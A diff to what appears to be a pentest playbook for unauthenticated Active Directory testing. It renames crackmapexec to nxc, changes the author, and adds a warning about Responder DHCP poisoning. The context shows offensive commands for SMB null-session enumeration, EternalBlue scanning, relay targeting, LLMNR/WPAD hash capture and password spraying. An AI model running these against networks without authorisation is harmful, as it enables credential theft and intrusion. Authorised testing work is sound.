@@ -4,7 +4,7 @@ l0: Unauthenticated infra pentest with AD focus — host discovery, SMB/null-ses
 license: MIT
 metadata:
   version: "1.0.0"
-  author: community
+  author: AuditGuard
   tags: ["pentest", "infrastructure", "active-directory", "smb", "kerberos", "unauthenticated"]
 ---
 
@@ -114,10 +114,10 @@ Goal: Identify accessible shares, read sensitive files, and extract any credenti
 #### 3.1 Check for null and guest session access
 ```bash
 # Test null session (no creds)
-crackmapexec smb targets/smb_hosts.txt -u '' -p '' --shares 2>/dev/null | tee smb/null_session_shares.txt
+nxc smb targets/smb_hosts.txt -u '' -p '' --shares 2>/dev/null | tee smb/null_session_shares.txt
 
 # Test guest session
-crackmapexec smb targets/smb_hosts.txt -u 'guest' -p '' --shares 2>/dev/null | tee smb/guest_session_shares.txt
+nxc smb targets/smb_hosts.txt -u 'guest' -p '' --shares 2>/dev/null | tee smb/guest_session_shares.txt
 
 # smbclient per-host check
 while read ip; do
@@ -174,7 +174,7 @@ nmap -p 445 --script smb-vuln-ms17-010 -iL targets/smb_hosts.txt -oA smb/eternal
 nmap -p 445 --script smb-security-mode -iL targets/smb_hosts.txt | grep -i "message_signing\|SMBv1"
 
 # Check signing enforcement (prerequisite for relay attacks)
-crackmapexec smb targets/smb_hosts.txt --gen-relay-list smb/relay_candidates.txt
+nxc smb targets/smb_hosts.txt --gen-relay-list smb/relay_candidates.txt
 ```
 
 ---
@@ -481,6 +481,7 @@ responder -I eth0 -wdP
 - Responder should be started at the **beginning of the engagement** and left running throughout — hashes arrive whenever users access network resources, run scripts, or when scheduled tasks fire
 - Peak capture windows: **morning logon (08:00–09:30)** and **post-lunch (13:00–14:00)** when users are most active
 - WPAD (`-w`) is high-yield in environments with proxy-aware browsers — captures HTTP basic auth and NTLMv2 from browser traffic
+- **`-d` (DHCP poisoning) can disrupt the entire subnet** — it intercepts DHCP requests and assigns attacker-controlled gateway/DNS. Confirm explicit client approval before using `-d`. Omit it if disruption is not acceptable.
 - If no hashes arrive after 30 minutes, check: correct interface, L2 adjacency to targets, and whether LLMNR is disabled via GPO (increasingly common on hardened networks)
 
 #### 8.3 DNS zone transfer (often forgotten)
@@ -501,7 +502,7 @@ nmap -sU -p 137 --script nbstat -iL live_hosts.txt -oA discovery/netbios
 nmap -p 3389 --script rdp-enum-encryption -iL targets/rdp_hosts.txt
 
 # WinRM — test if accessible
-crackmapexec winrm targets/winrm_hosts.txt -u '' -p ''
+nxc winrm targets/winrm_hosts.txt -u '' -p ''
 ```
 
 #### 8.6 Password spraying (caution — lockout risk)
@@ -510,7 +511,7 @@ crackmapexec winrm targets/winrm_hosts.txt -u '' -p ''
 # Only spray if lockout threshold is known and you stay well below it
 
 # Spray with one password across all valid users
-crackmapexec smb targets/smb_hosts.txt \
+nxc smb targets/smb_hosts.txt \
   -u targets/userlist.txt \
   -p 'Winter2024!' \
   --continue-on-success \
